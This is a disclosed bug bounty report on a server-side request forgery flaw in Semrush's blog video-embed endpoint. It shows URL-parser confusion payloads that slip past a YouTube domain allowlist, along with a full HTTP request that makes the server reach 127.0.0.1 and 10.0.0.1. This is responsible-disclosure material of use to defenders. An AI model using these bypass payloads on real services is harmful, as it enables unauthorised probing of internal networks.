# SSRF In Get Video Contents

## Report Details
- **Report ID**: 643622
- **URL**: https://hackerone.com/reports/643622
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-07-15T14:03:24.592Z
- **Disclosed**: 2019-08-19T04:35:21.212Z

## Reporter
- **Username**: egoist233
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: semrush

## Vulnerability Information
> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!

**Summary:** 
A SSRF In Get Video Contents

**Description:** 
When I test a function which is get the video contents  from  youtube, I found it can requests 127.0.0.1.

## Steps To Reproduce:

[**Obligated field**. Add details for how we can reproduce the issue]

  1. Open your blog url: https://www.semrush.com/my-posts/1111111111/edit/
  2. Click the `add video` (PIC1)
  3. I found only use the trust domain, the service would request
  4 I  use URL: `http://127.0.0.1/`, and it response `{"status":403,"error":{"url":["Not valid url"]}}`
  5. I use URL: `https://1:@my.site:\@@@@w.youtube.com/@https://www.youtube.com/`, and it requests my service! (PIC2)
  6. I use URL: `https://1:@127.0.0.1:\@@@@w.youtube.com/@https://www.youtube.com/`, and the response is `{"status":404,"error":"Invalid url 'https:\/\/1:@127.0.0.1:\\@@@@w.youtube.com\/@https:\/www.youtube.com\/' (Status code 404)"}`.(PIC3)
   7. I use URL `https://1:@10.0.0.1:\@@@@w.youtube.com/@https://www.youtube.com/` , and the response is `{"status":404,"error":"Connection timed out after 10001 milliseconds"}`.(PIC4)
   

  
## Supporting Material/References:
[**Obligated field**]
 requests:
```http
GET /blog/services/oembed/?url=https://1:@127.0.0.1:\@@@@w.youtube.com/@https://www.youtube.com/&callback=CKEDITOR._.jsonpCallbacks[89] HTTP/1.1
Host: www.semrush.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: https://www.semrush.com//my-posts/████/edit/
Connection: close
███
X-Forwarded-For: 127.0.0.1

```

## Impact

Probe intranet

## Attachments
- pic1.png
- pic2.png
